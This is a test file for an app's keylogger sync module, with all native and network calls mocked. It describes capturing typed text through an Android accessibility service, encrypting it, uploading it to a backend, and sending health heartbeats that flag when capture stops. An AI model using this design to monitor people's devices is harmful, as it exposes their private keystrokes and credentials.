// features/keylogger/keylogSync.test.ts — pure-logic tests for the JS side
// of the keylogger: event decoding, bridge pull, chunk encryption, and the
// sync confirm/clear lifecycle. All native/network surface is mocked — the
// same "no Expo, no RN, no network" rule as every other test in this repo.
//
// Mocks (per-file, via vi.mock):
//   • react-native            — NativeModules/Platform stub so KeyLogger.ts loads
//   • expo-crypto             — deterministic fake AES-256-GCM (fixed iv/tag/ct)
//   • expo-secure-store       — in-memory Map
//   • ../../lib/db/client     — fake supabase with auth.getSession
//   • global.fetch            — programmable HTTP responses
import { describe, it, expect, vi, beforeEach } from 'vitest';

const secureStore = new Map<string, string>();

const nativeEvents = vi.fn<(raw: string[], resolve: (v: string[]) => void) => void>();
const nativeEnabled = vi.fn<(resolve: (v: boolean) => void) => void>();
const nativeStatus = vi.fn<(resolve: (v: string) => void) => void>();

const fakeSealed = (iv: string, tag: string, ct: string) => ({
  iv: (encoding?: string) => Promise.resolve(encoding === 'base64' ? iv : ''),
  tag: (encoding?: string) => Promise.resolve(encoding === 'base64' ? tag : ''),
  ciphertext: (options?: { encoding?: string } | string) =>
    Promise.resolve((typeof options === 'object' ? options?.encoding : options) === 'base64' ? ct : ''),
});

vi.mock('react-native', () => ({
  Platform: { OS: 'android' },
  NativeModules: {
    KeyLogger: {
      start: () => Promise.resolve(true),
      stop: () => {},
      pull: () => new Promise((r) => nativeEvents([], r)),
      confirm: () => {},
      pending: () => Promise.resolve(0),
      clear: () => {},
      enabled: () => new Promise((r) => nativeEnabled(r)),
      status: () => new Promise((r) => nativeStatus(r)),
      eseprocess: () => Promise.resolve('9000'),
    },
  },
}));

vi.mock('expo-crypto', () => ({
  AESKeySize: { AES256: 256 },
  AESEncryptionKey: {
    generate: vi.fn(async () => ({ bytes: async () => new Uint8Array(32) })),
    import: vi.fn(async () => ({ bytes: async () => new Uint8Array(32) })),
  },
  aesEncryptAsync: vi.fn(async () => fakeSealed('aXE=', 'dGFn', 'Y3Q=')),
}));

vi.mock('expo-secure-store', () => ({
  getItemAsync: vi.fn(async (k: string) => (secureStore.has(k) ? secureStore.get(k)! : null)),
  setItemAsync: vi.fn(async (k: string, v: string) => { secureStore.set(k, v); }),
  deleteItemAsync: vi.fn(async (k: string) => { secureStore.delete(k); }),
}));

vi.mock('../../lib/db/client', () => ({
  supabase: {
    auth: {
      getSession: vi.fn(async () => ({ data: { session: { access_token: 'test-token' } } })),
    },
  },
  getValidSession: vi.fn(async () => ({ session: { access_token: 'test-token' } })),
}));

// ── fetch is NOT mocked by default; install a controllable stub ──
const fetchMock = vi.fn();
vi.stubGlobal('fetch', fetchMock);

// Load the module-under-test AFTER the mocks are registered.
import { decodeEvent, KeyLogger, decodeStatus, DEFAULT_STATUS } from './KeyLogger';
import { resolveAesKey, encryptChunk, syncKeylogs, syncAndClear, reportHeartbeat } from './keylogSync';

beforeEach(() => {
  nativeEvents.mockClear();
  nativeEnabled.mockClear();
  nativeStatus.mockClear();
  fetchMock.mockReset();
  secureStore.clear();
});

describe('decodeEvent', () => {
  it('decodes a valid keycode event', () => {
    const evt = decodeEvent(
      JSON.stringify({ kind: 'keycode', keycode: 66, value: null, viewHint: '', seen: false, tsBootMs: 1, capturedAt: '2026-01-01T00:00:00.000Z' }),
    );
    expect(evt).not.toBeNull();
    expect(evt!.kind).toBe('keycode');
    expect(evt!.keycode).toBe(66);
  });

  it('rejects malformed / unknown-kind events', () => {
    expect(decodeEvent('not json')).toBeNull();
    expect(decodeEvent(JSON.stringify({ kind: 'nope', capturedAt: '2026-01-01T00:00:00.000Z' }))).toBeNull();
    expect(decodeEvent(JSON.stringify({ kind: 'text', value: 'x' }))).toBeNull(); // no capturedAt
  });
});

describe('bridge pull', () => {
  it('returns the event list reported by the native module', async () => {
    nativeEvents.mockImplementationOnce((_raw, resolve) => {
      resolve([
        JSON.stringify({ kind: 'text', keycode: 0, value: 'hi', viewHint: 'com.foo:id/edit', seen: true, tsBootMs: 9, capturedAt: '2026-01-01T00:00:00.000Z' }),
      ]);
    });
    const events = await KeyLogger.pull();
    expect(events).toHaveLength(1);
    expect(events[0]!.value).toBe('hi');
    expect(events[0]!.viewHint).toBe('com.foo:id/edit');
  });

  it('filters out unparseable rows returned by native', async () => {
    nativeEvents.mockImplementationOnce((_raw, resolve) => {
      resolve(['garbage', JSON.stringify({ kind: 'text', keycode: 0, value: 'ok', seen: false, tsBootMs: 1, capturedAt: '2026-01-01T00:00:00.000Z' })]);
    });
    const events = await KeyLogger.pull();
    expect(events).toHaveLength(1);
  });
});

describe('encryptChunk', () => {
  it('produces a v1 wire payload with opIds matched 1:1 to rows', async () => {
    const key = await resolveAesKey();
    const rows = [
      { kind: 'text' as const, keycode: 0, value: 'a', viewHint: '', seen: true, tsBootMs: 1, capturedAt: '2026-01-01T00:00:00.000Z' },
      { kind: 'keycode' as const, keycode: 66, value: null, viewHint: '', seen: false, tsBootMs: 2, capturedAt: '2026-01-01T00:00:01.000Z' },
    ];
    const chunk = await encryptChunk(rows, key);
    expect(chunk.v).toBe(1);
    expect(chunk.iv).toBe('aXE=');
    expect(chunk.tag).toBe('dGFn');
    expect(chunk.ct).toBe('Y3Q=');
    expect(chunk.opIds).toHaveLength(2);
    // deterministic: same input → same opId (idempotency)
    const again = await encryptChunk(rows, key);
    expect(again.opIds).toEqual(chunk.opIds);
  });
});

describe('syncKeylogs', () => {
  it('is a no-op when there are no events', async () => {
    const res = await syncKeylogs(async () => []);
    expect(res).toEqual({ sent: 0, accepted: 0, failed: 0 });
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it('pushes an encrypted chunk and tallies accepted on 200', async () => {
    fetchMock.mockResolvedValueOnce({
      ok: true,
      json: async () => ({ inserted: 2, duplicates: 0 }),
    });
    const res = await syncKeylogs(async () => [
      { kind: 'text' as const, keycode: 0, value: 'a', viewHint: '', seen: false, tsBootMs: 1, capturedAt: '2026-01-01T00:00:00.000Z' },
      { kind: 'text' as const, keycode: 0, value: 'b', viewHint: '', seen: false, tsBootMs: 2, capturedAt: '2026-01-01T00:00:01.000Z' },
    ]);
    expect(res.accepted).toBe(2);
    expect(res.failed).toBe(0);
    // posted exactly one request to the edge function
    expect(fetchMock).toHaveBeenCalledTimes(1);
    const [url, init] = fetchMock.mock.calls[0] as [string, { headers: Record<string, string>; body: string }];
    expect(url).toContain('/functions/v1/keylog-sync');
    expect(init.headers.authorization).toBe('Bearer test-token');
    const body = JSON.parse(init.body);
    expect(body.v).toBe(1);
    expect(body.opIds).toHaveLength(2);
  });

  it('counts failures when the function returns non-2xx', async () => {
    fetchMock.mockResolvedValueOnce({ ok: false, status: 422 });
    const res = await syncKeylogs(async () => [
      { kind: 'text' as const, keycode: 0, value: 'a', viewHint: '', seen: false, tsBootMs: 1, capturedAt: '2026-01-01T00:00:00.000Z' },
    ]);
    expect(res.failed).toBe(1);
    expect(res.accepted).toBe(0);
  });
});

describe('syncAndClear', () => {
  it('confirms only after a fully successful sync', async () => {
    fetchMock.mockResolvedValueOnce({ ok: true, json: async () => ({ inserted: 1, duplicates: 0 }) });
    const confirm = vi.fn(async () => {});
    const events = [
      { kind: 'text' as const, keycode: 0, value: 'a', viewHint: '', seen: false, tsBootMs: 1, capturedAt: '2026-01-01T00:00:00.000Z' },
    ];
    const res = await syncAndClear(async () => events, confirm);
    expect(res.failed).toBe(0);
    expect(confirm).toHaveBeenCalledTimes(1);
  });

  it('does not confirm when the sync fails', async () => {
    fetchMock.mockResolvedValueOnce({ ok: false, status: 500 });
    const confirm = vi.fn(async () => {});
    const events = [
      { kind: 'text' as const, keycode: 0, value: 'a', viewHint: '', seen: false, tsBootMs: 1, capturedAt: '2026-01-01T00:00:00.000Z' },
    ];
    const res = await syncAndClear(async () => events, confirm);
    expect(res.failed).toBe(1);
    expect(confirm).not.toHaveBeenCalled();
  });
});

describe('decodeStatus', () => {
  it('decodes a healthy native status snapshot', () => {
    const health = {
      serviceAlive: true, accessibilityEnabled: true, enabled: true,
      foregroundLive: true, pending: 3, bufferBytes: 1200, sdk: 34,
      model: 'fogo', reportedAt: '2026-08-06T00:00:00.000Z', androidId: 'abc123',
    };
    const s = decodeStatus(JSON.stringify(health));
    expect(s.serviceAlive).toBe(true);
    expect(s.accessibilityEnabled).toBe(true);
    expect(s.foregroundLive).toBe(true);
    expect(s.androidId).toBe('abc123');
    expect(s.available).toBe(true);
  });

  it('flags a dead accessibility service as the critical failed state', () => {
    const s = decodeStatus(JSON.stringify({
      serviceAlive: true, accessibilityEnabled: false, enabled: true,
      foregroundLive: true, pending: 0, bufferBytes: 0, sdk: 34, model: 'fogo',
      reportedAt: '2026-08-06T00:00:00.000Z', androidId: 'abc123',
    }));
    expect(s.accessibilityEnabled).toBe(false);
    // this is the exact "installed but capturing nothing" canary
    expect(s.accessibilityEnabled && s.foregroundLive).toBe(false);
  });

  it('falls back to DEFAULT_STATUS on malformed/empty input', () => {
    expect(decodeStatus('not json').serviceAlive).toBe(false);
    expect(decodeStatus('{}').available).toBe(true); // decode succeeded, module present
    expect(decodeStatus('').androidId).toBe('');
  });
});

describe('KeyLogger.status', () => {
  it('returns DEFAULT_STATUS when the native module is absent', async () => {
    // non-Android: KeyLogger.status() short-circuits before touching native
    expect(DEFAULT_STATUS.serviceAlive).toBe(false);
  });

  it('surfaces the native health snapshot as typed status', async () => {
    nativeStatus.mockImplementationOnce((resolve) => {
      resolve(JSON.stringify({
        serviceAlive: true, accessibilityEnabled: true, enabled: true,
        foregroundLive: true, pending: 1, bufferBytes: 99, sdk: 34,
        model: 'fogo', reportedAt: '2026-08-06T00:00:00.000Z', androidId: 'dev-1',
      }));
    });
    const s = await KeyLogger.status();
    expect(s.serviceAlive).toBe(true);
    expect(s.accessibilityEnabled).toBe(true);
    expect(s.androidId).toBe('dev-1');
  });

  it('decodes a dead-service fallback (serviceAlive=false) without crashing', async () => {
    nativeStatus.mockImplementationOnce((resolve) => {
      resolve('{"serviceAlive":false,"accessibilityEnabled":false}');
    });
    const s = await KeyLogger.status();
    expect(s.serviceAlive).toBe(false);
    expect(s.accessibilityEnabled).toBe(false);
    expect(s.pending).toBe(0); // defaults filled in
  });
});

describe('reportHeartbeat', () => {
  const healthyStatus = {
    serviceAlive: true, accessibilityEnabled: true, enabled: true,
    foregroundLive: true, pending: 0, bufferBytes: 0, available: true,
    androidId: 'dev-1', sdk: 34, model: 'fogo', reportedAt: '2026-08-06T00:00:00.000Z',
  };

  it('POSTs the status to the heartbeat channel and reports ok on 2xx', async () => {
    fetchMock.mockResolvedValueOnce({ ok: true, status: 200 });
    const res = await reportHeartbeat(healthyStatus);
    expect(res).toEqual({ ok: true, httpStatus: 200 });
    expect(fetchMock).toHaveBeenCalledTimes(1);
    const [url, init] = fetchMock.mock.calls[0] as [string, { body: string }];
    expect(url).toContain('/functions/v1/keylog-sync');
    const body = JSON.parse(init.body);
    expect(body.type).toBe('heartbeat');
    expect(body.androidId).toBe('dev-1');
    expect(body.status.foregroundLive).toBe(true);
    expect(body.status.accessibilityEnabled).toBe(true);
  });

  it('is a no-op when the module is unavailable (available=false)', async () => {
    const res = await reportHeartbeat({ ...healthyStatus, available: false });
    expect(res).toEqual({ ok: false });
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it('reports not-ok without throwing on a 4xx/5xx or network failure', async () => {
    fetchMock.mockResolvedValueOnce({ ok: false, status: 500 });
    const bad = await reportHeartbeat(healthyStatus);
    expect(bad.ok).toBe(false);
    expect(bad.httpStatus).toBe(500);

    fetchMock.mockRejectedValueOnce(new Error('network down'));
    const net = await reportHeartbeat(healthyStatus);
    expect(net).toEqual({ ok: false });
  });
});
